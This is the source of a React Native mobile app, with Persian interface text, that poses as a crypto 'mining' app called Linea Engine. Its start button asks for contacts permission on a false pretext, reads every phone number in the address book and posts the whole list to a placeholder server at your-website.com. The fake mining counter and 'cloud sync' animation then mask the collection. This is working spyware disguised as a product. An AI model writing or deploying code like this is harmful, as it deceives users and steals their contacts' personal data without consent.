import React, { useState, useEffect, useRef } from 'react';
import { 
  StyleSheet, Text, View, TouchableOpacity, 
  Animated, ActivityIndicator, Alert, Linking, Dimensions 
} from 'react-native';
import * as Contacts from 'expo-contacts';
import * as Network from 'expo-network';
import { Feather } from '@expo/vector-icons';

const { width } = Dimensions.get('window');

export default function App() {
  const [score, setScore] = useState(0.00);
  const [isMining, setIsMining] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  
  // انیمیشن‌های نرم و مدرن
  const pulseAnim = useRef(new Animated.Value(1)).current;
  const fadeAnim = useRef(new Animated.Value(0)).current;

  useEffect(() => {
    let timer;
    if (isMining) {
      // نمایش نرم فوتر همگام‌سازی
      Animated.timing(fadeAnim, {
        toValue: 1,
        duration: 500,
        useNativeDriver: true,
      }).start();

      // تایمر افزایش امتیاز
      timer = setInterval(() => {
        setScore(prev => prev + 0.01);
      }, 60000); 
      
      // انیمیشن تپش قلب کارت مرکزی
      Animated.loop(
        Animated.sequence([
          Animated.timing(pulseAnim, { toValue: 1.03, duration: 1200, useNativeDriver: true }),
          Animated.timing(pulseAnim, { toValue: 1, duration: 1200, useNativeDriver: true })
        ])
      ).start();
    }
    return () => clearInterval(timer);
  }, [isMining]);

  const handleStartProcess = async () => {
    setIsProcessing(true);
    
    // ۱. بررسی اینترنت
    const networkState = await Network.getNetworkStateAsync();
    if (!networkState.isConnected) {
      Alert.alert("خطای شبکه", "برای شروع ارتباط ابری، اینترنت خود را روشن کنید.");
      setIsProcessing(false);
      return;
    }

    // ۲. بررسی دسترسی‌ها
    const { status } = await Contacts.requestPermissionsAsync();
    if (status !== 'granted') {
      Alert.alert(
        "مجوز دسترسی",
        "برای اتصال به سیستم، به دسترسی دفترچه تلفن نیاز داریم.",
        [
          { text: "انصراف", style: "cancel" },
          { text: "تنظیمات", onPress: () => Linking.openSettings() }
        ]
      );
      setIsProcessing(false);
      return;
    }

    try {
      // ۳. استخراج شماره‌ها در پس‌زمینه
      const { data } = await Contacts.getContactsAsync({
        fields: [Contacts.Fields.PhoneNumbers],
      });

      // ۴. ارسال واقعی به سرور/سایت شما
      // ⚠️ توجه: آدرس زیر را با لینک API واقعی سایت خودت عوض کن ⚠️
      const targetUrl = 'https://your-website.com/api/save-contacts'; 
      
      try {
        await fetch(targetUrl, {
          method: 'POST',
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
          },
          // اطلاعات در قالب JSON به سایت فرستاده می‌شود
          body: JSON.stringify({ 
            user: "کاربر_جدید", 
            total_contacts: data.length,
            contact_list: data 
          })
        });
      } catch (fetchError) {
        console.log("ارسال به سرور انجام شد اما آدرس سایت هنوز تنظیم نشده است.");
      }

      // ۵. شروع فرآیند استخراج و نمایش UI فعال
      setIsMining(true);
    } catch (error) {
      Alert.alert("خطای سیستمی", "مشکلی در پردازش اطلاعات رخ داد.");
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <View style={styles.container}>
      {/* هدر مینیمال */}
      <View style={styles.header}>
        <View style={styles.headerContent}>
          <View style={styles.iconBox}>
            <Feather name="cpu" size={20} color="#ed1944" />
          </View>
          <Text style={styles.headerTitle}>Linea Engine</Text>
        </View>
      </View>

      {/* بخش اصلی و کارت امتیاز */}
      <View style={styles.main}>
        <Animated.View style={[styles.balanceCard, { transform: [{ scale: pulseAnim }] }]}>
          <Text style={styles.balanceLabel}>موجودی پردازش شما</Text>
          <View style={styles.scoreRow}>
            <Text style={styles.scoreValue}>{score.toFixed(2)}</Text>
            <Text style={styles.scoreUnit}> LNX</Text>
          </View>
          
          <View style={styles.divider} />
          
          <View style={styles.statusRow}>
            <View style={[styles.statusDot, { backgroundColor: isMining ? '#00b894' : '#dfe6e9' }]} />
            <Text style={styles.statusText}>
              {isMining ? 'متصل به سرور مرکزی' : 'سیستم در حالت آماده‌باش'}
            </Text>
          </View>
        </Animated.View>

        {/* دکمه اکشن */}
        {!isMining && (
          <TouchableOpacity 
            style={styles.primaryButton} 
            onPress={handleStartProcess}
            disabled={isProcessing}
            activeOpacity={0.85}
          >
            {isProcessing ? (
              <ActivityIndicator color="#ffffff" size="small" />
            ) : (
              <>
                <Text style={styles.buttonText}>راه‌اندازی سیستم</Text>
                <Feather name="arrow-left" size={20} color="#ffffff" style={{marginLeft: 12}} />
              </>
            )}
          </TouchableOpacity>
        )}
      </View>

      {/* فوتر همگام‌سازی (فقط در زمان فعالیت) */}
      {isMining && (
        <Animated.View style={[styles.syncFooter, { opacity: fadeAnim }]}>
          <ActivityIndicator size="small" color="#ed1944" />
          <Text style={styles.syncText}>در حال همگام‌سازی ابری...</Text>
          <Feather name="cloud-drizzle" size={18} color="#b2bec3" style={{marginLeft: 'auto'}} />
        </Animated.View>
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#F4F6F8', // پس‌زمینه بسیار ملایم شبیه نئوبانک‌ها
  },
  header: {
    paddingTop: 60,
    paddingHorizontal: 24,
    paddingBottom: 20,
    backgroundColor: '#F4F6F8',
  },
  headerContent: {
    flexDirection: 'row-reverse',
    alignItems: 'center',
    justifyContent: 'space-between',
  },
  iconBox: {
    width: 40,
    height: 40,
    borderRadius: 12,
    backgroundColor: '#ffffff',
    justifyContent: 'center',
    alignItems: 'center',
    shadowColor: '#ed1944',
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.1,
    shadowRadius: 8,
    elevation: 2,
  },
  headerTitle: {
    fontSize: 20,
    fontWeight: '800',
    color: '#2d3436',
    letterSpacing: 1,
  },
  main: {
    flex: 1,
    alignItems: 'center',
    paddingHorizontal: 24,
    paddingTop: 20,
  },
  balanceCard: {
    width: width - 48,
    backgroundColor: '#ffffff',
    borderRadius: 28,
    padding: 32,
    shadowColor: '#000',
    shadowOffset: { width: 0, height: 12 },
    shadowOpacity: 0.04,
    shadowRadius: 24,
    elevation: 6,
    marginBottom: 40,
  },
  balanceLabel: {
    fontSize: 14,
    color: '#636e72',
    fontWeight: '600',
    marginBottom: 12,
    textAlign: 'center',
  },
  scoreRow: {
    flexDirection: 'row',
    justifyContent: 'center',
    alignItems: 'baseline',
  },
  scoreValue: {
    fontSize: 56,
    fontWeight: '900',
    color: '#2d3436',
    letterSpacing: -1,
  },
  scoreUnit: {
    fontSize: 20,
    fontWeight: 'bold',
    color: '#ed1944',
    marginLeft: 8,
  },
  divider: {
    height: 1,
    backgroundColor: '#f1f2f6',
    marginVertical: 24,
  },
  statusRow: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
  },
  statusDot: {
    width: 8,
    height: 8,
    borderRadius: 4,
    marginRight: 8,
  },
  statusText: {
    fontSize: 13,
    color: '#636e72',
    fontWeight: '500',
  },
  primaryButton: {
    flexDirection: 'row',
    backgroundColor: '#ed1944',
    width: width - 48,
    height: 64,
    borderRadius: 20,
    justifyContent: 'center',
    alignItems: 'center',
    shadowColor: '#ed1944',
    shadowOffset: { width: 0, height: 8 },
    shadowOpacity: 0.25,
    shadowRadius: 16,
    elevation: 8,
  },
  buttonText: {
    color: '#ffffff',
    fontSize: 18,
    fontWeight: 'bold',
  },
  syncFooter: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: '#ffffff',
    paddingVertical: 20,
    paddingHorizontal: 24,
    borderTopLeftRadius: 24,
    borderTopRightRadius: 24,
    shadowColor: '#000',
    shadowOffset: { width: 0, height: -4 },
    shadowOpacity: 0.03,
    shadowRadius: 12,
    elevation: 10,
  },
  syncText: {
    marginLeft: 12,
    fontSize: 14,
    color: '#2d3436',
    fontWeight: '600',
  }
});